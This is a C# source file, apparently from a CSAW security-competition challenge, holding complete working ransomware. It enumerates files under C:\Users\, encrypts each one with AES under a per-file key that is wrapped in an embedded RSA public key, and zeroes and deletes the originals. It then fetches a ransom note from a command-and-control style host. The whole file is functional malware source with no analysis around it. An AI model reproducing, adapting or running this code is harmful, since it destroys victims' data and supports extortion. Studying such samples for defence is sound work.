using System.Net;
using System.Security.Cryptography;

namespace Ransomware
{
    class Program
    {
        static void FileEnumeration(string dir, List<FileInfo> files)
        {
            foreach (string file in Directory.GetFiles(dir, "*.*", SearchOption.TopDirectoryOnly))
            {
                if (CheckFile(new FileInfo(file)) == true)
                {
                    files.Add(new FileInfo(file));
                }
            }
            foreach (string subDir in Directory.GetDirectories(dir))
            {
                if (CheckDirectory(subDir) == true)
                {
                    try
                    {
                        FileEnumeration(subDir, files);
                    }
                    catch (UnauthorizedAccessException ex) { }
                }
            }
        }

        static void Encrypt(string filename)
        {
            try
            {
                byte[] keyBytes = Generate128BitsOfRandomEntropy();
                byte[] IVbytes = Generate128BitsOfRandomEntropy();
                byte[] plain = System.IO.File.ReadAllBytes(filename);
                byte[] enc = new byte[0];
                var publicKey = "-----BEGIN PUBLIC KEY-----\r\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApJDTDZg7SIi/SL9ppTW2\r\nQgJ2JNOLtGx8wMP2Ueck38yrizw8UKSwPHN5xVzTEPWXximtGp92JvWDnlzcScih\r\nHDnUKPYD3qoovp97PYLumqKvilGsWM+R3+Dose7jf9uMWvk6wogZ4U9/Caoem4nM\r\nkg1/nsE036BOrcfG0bOcBWA2F/KPSs9tHG2nAPIZCbSeuJKh+Xuh4ysMYV78vzGP\r\nDJwNpzqS6o+yDDgMLUmTbRJ4Go17FTbsICB7t1+VqCW/jUdcDuixhrAPTPlNTilb\r\nI3MVhmuVkaEuXrxcdRqKPJocjA8Jbb7hNoTErefXzGVt/uRHKBfJpvFAnHoB7mbc\r\n9OJr8xAdJxh+yMDY8sQAy2kgCY0+EfEhS8IVZPimRO06bfgwQaZ9ZVx52axQ3D0M\r\n9MoIbDOwCAWe+8JGZDiUic9LtPXldbsZ6UNBjFSZVqSVzut6iRLfA9kAGETEE+Ae\r\nsA6PBmj74DL5SRdYNAQtu6x//Sj7WkRy/ashRJFn6wyd0Bx16aMYwhJD5w1ijZYV\r\nbv9IIqOb+Aum7oRGKVmhPtjAaz7OXUaXBvo4K+wuWCnLsVM7mL16GbNJ5cAMn18D\r\nTbWhs2bA0CHCF5RF7SMBmsCUAj32bLyb3Mz9fGWD+xJuGPPyYGdLn7UOg+fzmmzZ\r\ns9M2WrxRPuuhVdbs9rl7rGECAwEAAQ==\r\n-----END PUBLIC KEY-----";
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 128;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, IVbytes))
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                            {
                                using (var rsa = new RSACryptoServiceProvider(4096))
                                {
                                    rsa.ImportFromPem(publicKey.ToString());
                                    byte[] rsaBytes = keyBytes.Concat(IVbytes).ToArray();
                                    var encryptedKey = rsa.Encrypt(rsaBytes, true);
                                    cryptoStream.Write(plain, 0, plain.Length);
                                    cryptoStream.FlushFinalBlock();
                                    enc = enc.Concat(encryptedKey).ToArray();
                                    enc = enc.Concat(memoryStream.ToArray()).ToArray();
                                    memoryStream.Close();
                                    cryptoStream.Close();
                                    rsa.PersistKeyInCsp = false;
                                }
                            }
                        }
                    }
                }
                var encFilename = Path.GetDirectoryName(filename) + '\\' + Path.GetFileName(filename).Replace(Path.GetExtension(filename), ".EXTEN");
                System.IO.File.WriteAllBytes(encFilename, enc);
                System.IO.File.WriteAllBytes(filename, new byte[plain.Length]);
                File.Delete(filename);
            }
            catch (Exception ex) { }
        }

        static void Main()
        {
            List<FileInfo> filesToEncrypt = new List<FileInfo>();
            FileEnumeration("C:\\Users\\", filesToEncrypt);
            foreach (FileInfo file in filesToEncrypt)
            {
                Encrypt(file.FullName);
            }
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(new Uri("http://infected-c2.csaw.io/static?file=ransom%20note.png"), @"c:\hahaha.png");
            }
        }

        private static byte[] Generate128BitsOfRandomEntropy()
        {
            var randomBytes = new byte[16];
            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(randomBytes);
            }
            return randomBytes;
        }

        private static bool CheckFile(FileInfo file)
        {
            var filename = file.FullName;
            if (Path.GetExtension(filename) == ".exe" || Path.GetExtension(filename) == ".dll" || Path.GetExtension(filename) == ".lnk" || Path.GetExtension(filename) == ".sys" || Path.GetExtension(filename) == ".msi" || Path.GetExtension(filename) == ".EXTEN" || Path.GetExtension(filename) == ".ost" || Path.GetExtension(filename) == ".pst" || Path.GetFileName(filename) == "RansomNote.txt" || Path.GetFileName(filename) == "desktop.ini")
            {
                return false;
            }
            return true;
        }

        private static bool CheckDirectory(string dir)
        {
            if (dir.Contains("tmp", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("winnt", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("temp", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("thumb", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("$Recycle.Bin", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("System Volume Information", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("Boot", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("Windows", System.StringComparison.CurrentCultureIgnoreCase) || dir.Contains("Downloads", System.StringComparison.CurrentCultureIgnoreCase))
            {
                return false;
            }
            return true;
        }
    }
}